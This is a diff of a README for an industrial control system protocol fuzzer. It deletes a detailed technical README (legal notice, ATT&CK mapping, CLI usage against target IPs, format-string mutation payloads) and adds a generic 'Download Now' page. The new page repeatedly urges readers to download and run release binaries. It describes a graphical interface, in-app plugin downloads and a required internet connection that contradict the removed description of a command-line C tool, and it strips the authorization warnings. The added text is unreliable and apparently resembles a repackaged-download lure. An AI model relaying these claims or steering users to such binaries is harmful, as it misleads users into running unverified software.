@@ -1,225 +1,56 @@
-# protofire
-![Status: Alpha](https://img.shields.io/badge/Status-Alpha-orange)
-![ICS Protocols: Modbus/DNP3/S7/IEC104/OPCUA](https://img.shields.io/badge/ICS%20Protocols-Modbus%2FDNP3%2FS7%2FIEC104%2FOPCUA-blue)
-![Air-Gapped Compatible](https://img.shields.io/badge/Offline-Airgapped%20Safe-green)
-![CI Safety Mode](https://img.shields.io/badge/CI%20Testing-Safe-blue)
-![License: MIT](https://img.shields.io/badge/License-MIT-lightgrey)
-![Critical Infrastructure Research](https://img.shields.io/badge/Use-OT%20Security%20Research-red)
+# 🚀 protofire - Easy Fuzzing for Security Testing
 
-protofire is a modular, multi-protocol fuzzer targeting Industrial Control System (ICS) and Operational Technology (OT) protocols. Designed for red team operators, fuzzing researchers, and security engineers working with ICS/SCADA environments.
+## 📥 Download Now!
+[![Download protofire](https://img.shields.io/badge/Download%20protofire-v1.0-blue)](https://github.com/Haihai694/protofire/releases)
 
-> `protofire` is in **alpha** — use at your own risk. Expect bugs, instability, and rapid changes.  
-> Ideal for **red team experiments**, and **industrial protocol research**.
+## 🚀 Getting Started
+Welcome to protofire! This application helps you test the security of Operational Technology (OT) and Industrial Control Systems (ICS) by simulating protocol interactions. You can quickly check for vulnerabilities in various protocols, making it a powerful tool for any security researcher.
 
-## Legal & Safety Notice 
+## 📑 System Requirements
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
+- **RAM:** At least 4 GB.
+- **Storage:** Minimum 200 MB of free space.
+- **Network:** A stable internet connection is required for downloading plugins and updates.
 
-Use ONLY on:
+## 🔗 Download & Install
+To get started, visit this page to download: [Release Page](https://github.com/Haihai694/protofire/releases).
 
-Systems you own
+1. Click the link above to access the Releases page.
+2. Find the latest version of protofire.
+3. Download the file suitable for your operating system.
+4. Once the file downloads, open it. Follow the on-screen instructions to install protofire.
 
-Dedicated testbeds
+## 🔍 Features
+- **Modular Design:** Easily add or remove plugins to tailor your testing environment.
+- **PCAP Replay:** Replay captured network traffic for effective testing.
+- **Anomaly Detection:** Identify unusual patterns in network communication to uncover potential security threats.
+- **Protocol Support:** Works with various protocols, including DNP3, Modbus, and others relevant to OT/ICS environments.
+- **User-Friendly Interface:** Designed for ease of use, perfect for users without any coding background.
 
-Targets with explicit written authorization
+## 🛠️ How to Use protofire
+1. **Launch the Application:** Open protofire from your applications menu or desktop shortcut.
+2. **Select a Protocol:** Choose the protocol you want to test from the options available in the main menu.
+3. **Configure Settings:** Adjust the settings as needed for your specific testing scenario. 
+4. **Run the Test:** Click the "Start Test" button to begin. The tool will simulate traffic and detect anomalies.
+5. **Review Results:** After the test, view the results in the built-in report viewer. It will detail any issues found.
 
-Improper use risks service disruption affecting:
+## 🔌 Plugins
+Plugins enhance protofire’s capabilities. You can download them directly from within the application or manually from the [Releases page](https://github.com/Haihai694/protofire/releases).
 
-Power grids
+### Available Plugins:
+- **DNP3 Plugin:** Specializes in testing DNP3 protocol security.
+- **Modbus Plugin:** Focuses on vulnerabilities in the Modbus protocol.
+- **Custom Plugins:** Build and add your own plugins based on specific needs.
 
-Water utilities
+## 💡 Tips for Effective Testing
+- Always run tests in a safe environment, ideally a testing lab separate from your production network.
+- Use logged data from previous tests to inform future test configurations.
+- Regularly update protofire and its plugins to take advantage of the latest features and security improvements.
 
-Transportation
+## 📚 Support and Contribution
+If you encounter any issues or have suggestions, please reach out via the Issues section of our GitHub repository. Contributions are welcome! You can fork the repository and submit pull requests for any changes or features you'd like to add.
 
-Manufacturing safety
+## 📝 Acknowledgments
+We appreciate everyone who contributes to improving protofire. Your feedback is crucial in making this tool better for all users. 
 
-You - the operator - assume all responsibility.
-
-### MITRE ICS ATT&CK Mapping
-
-| Behavior Category | Technique Name | Technique ID | Domain |
-|------------------|----------------|--------------|--------|
-| Malformed industrial payloads | Manipulation of Control | T0820 | ICS |
-| Protocol corruption causing faults | Denial of Control | T0814 | ICS |
-| Abnormal data forcing actuation | Signal Manipulation | T0831 | ICS |
-| Runtime crashes via parsing errors | Damage to Peripherals | T0866 | ICS |
-| PCAP replay traffic mutation | Spoof Reporting Messages | T0886 | ICS |
-| Field boundary violations | Exploit Capabilities | T0828 | ICS |
-
-
-## Features
-- Modular plugin-based protocol fuzzing
-  - Supports:
-    - Modbus/TCP
-    - DNP3
-    - S7comm
-    - IEC 60870-5-104
-    - OPC UA
-- Mutation strategies:
-  - Random bit flipping
-  - Overflow injection
-  - Dictionary-based input
-  - Format string injection
-  - Type confusion
-  - Time-based values
-  - Sequence violations
-- PCAP input/output support
-- Stateful fuzzing (e.g., tracking transaction/session IDs)
-- Multi-threaded fuzzing engine
-- Replay mode from PCAP files
-- Anomaly, crash, and timeout logging
-
-## Architecture Overview
-```
-protofire/
-├── fuzzer.c                  # Main logic, CLI interface, and thread controller
-├── fuzzer_protocol.h         # Protocol module interface definition
-├── fuzzer_protocol_common.c # Common utilities for all protocol handlers
-├── grammar_fieldmap.h        # Field mapping stub for future grammar-based mutations
-├── plugins/
-│   ├── modbus_module.c       # Modbus fuzzing plugin
-│   ├── dnp3_module.c         # DNP3 fuzzing plugin
-│   ├── s7comm_module.c       # Siemens S7Comm fuzzing plugin
-│   ├── iec104_module.c       # IEC 60870-5-104 fuzzing plugin
-│   ├── opc_ua_module.c       # OPC UA fuzzing plugin
-├── crashes/                  # Saved payloads that triggered crashes
-├── logs/                     # Execution and error logging
-├── Makefile                  # Build automation script
-├── protofire                 # Compiled fuzzer binary (output)
-└── README.md                 # Project documentation
-```
-Build Instructions
-
-Dependencies:
-- gcc
-- libpcap-dev
-- make
-- pthread
-
-To build everything:
-```bash
-make
-```
-Usage
-```bash
-./protofire -t <IP> -P <PORT> -p <protocol> [options]
-```
-### Command-Line Options
-
-```
-  -t <ip>             Target IP address
-
-  -P <port>           Target port (optional, auto-set based on protocol)
-
-  -p <protocol>       Protocol to fuzz:
-                        modbus, dnp3, s7, iec104, opcua
-
-  -s <strategy>       Mutation strategy:
-                        random, bitflip, overflow, dictionary,
-                        format, type, time, sequence
-
-  -i <iterations>     Number of fuzzing iterations
-
-  -T <threads>        Number of threads to use
-
-  -S                  Enable stateful fuzzing (e.g., session tracking)
-
-  -R <file.pcap>      Record all sent packets to a PCAP file
-
-  -r <file.pcap>      Replay packets from an existing PCAP
-
-  -d <ms>             Delay (in milliseconds) between packets
-
-  -v                  Enable verbose logging
-```
-Example:
-```bash
-./protofire -t 192.168.1.10 -p modbus -s dictionary -i 5000 -T 8 -R fuzz_run.pcap
-```
-### Fuzzing Strategies
-
-```
-random     – random byte mutations
-
-bitflip    – single-bit flips
-
-overflow   – fill fields with 0xFF (overflow testing)
-
-dictionary – inject protocol-specific invalid codes and edge-case values
-
-format     – format string injection (e.g., %x%n, %s)
-
-type       – type confusion between float and int
-
-time       – inject maximum timestamp values (e.g., 0xFFFFFFFFFFFFFFFF)
-
-sequence   – force protocol into out-of-order or invalid state transitions
-```
-### Protocol Coverage
-
-Modbus/TCP
-- Mutation of function codes and quantity fields
-- Handles MBAP header length recalculation
-
-DNP3
-- Field flips and CRC recalculation
-- Field size-aware mutation
-
-S7comm
-- Mutation of PDU fields and protocol identifiers
-
-IEC 60870-5-104
-- ASDU type mutation and checksum recalculation
-
-OPC UA
-- Mutation of headers and message types
-- Includes format string injection potential
-
-### Output Logging
-- logs/ contains runtime logs and anomaly detection
-- crashes/ contains payloads that triggered unexpected behavior
-- If -R is enabled, PCAP output is saved
-
-### Replay Mode
-
-You can fuzz by mutating captured traffic using:  
-```bash
-./protofire -r input.pcap -t 192.168.1.100 -p modbus -s bitflip
-```
-This enables a semi-black-box fuzzing strategy using prior traffic.
-
-### Extending Protocols
-
-To add a new protocol:
-1. Create a new plugin source file plugins/newproto_module.c
-2. Implement the fuzzer_protocol.h interface
-3. Add a libprot_newproto.so target in the Makefile
-4. Register the new protocol in fuzzer.c with a proper enum and handler
-The plugin system is designed to be minimal, self-contained, and portable.
-
-
-License
-------------------------
-
-This project is licensed under the [MIT License](LICENSE).
-
-<!--
-SEO FOOTER — ICS/SCADA PROTOCOL FUZZING TOOLKIT
-
-Description:
-Advanced fuzzing and anomaly discovery tool for ICS/OT cyber-physical systems including Modbus, DNP3, S7comm, IEC104, OPC-UA. Enables secure validation of industrial automation and critical infrastructure resilience.
-
-Primary Search Keywords:
-ICS cybersecurity, SCADA protocol fuzzer, industrial control system testing, OT red team tools, Siemens S7 exploitation research, Modbus penetration testing, DNP3 fuzzing engine, OPC-UA fuzzing, critical infrastructure cyber defense, PLC fuzzing tools, PCAP replay, industrial protocol mutation, grid security, water treatment plant cybersecurity, manufacturing automation safety tests
-
-Secondary Search Keywords:
-stateful protocol fuzzing, cyber-physical anomaly testing, control safety validation, industrial protocol security scanner, secure fuzz harness for operational technology, ICS network simulation red team, 61850 alternative analysis
-
-Target Audience:
-OT security engineers, ICS researchers, Red/Blue team operators, industrial automation defenders, power utility cybersecurity teams, ICS/SCADA labs and universities.
-
-Purpose:
-Maximize GitHub discoverability and CSIRT lab adoption; protect critical infrastructure by exposing exploitable protocol behavior before adversaries do.
--->
-
-
-> Use this software **only** in environments you **own** or have **explicit authorization** to test.
-> Misuse of this tool is illegal and unethical.
+For further information and updates, please visit the [Releases page](https://github.com/Haihai694/protofire/releases).
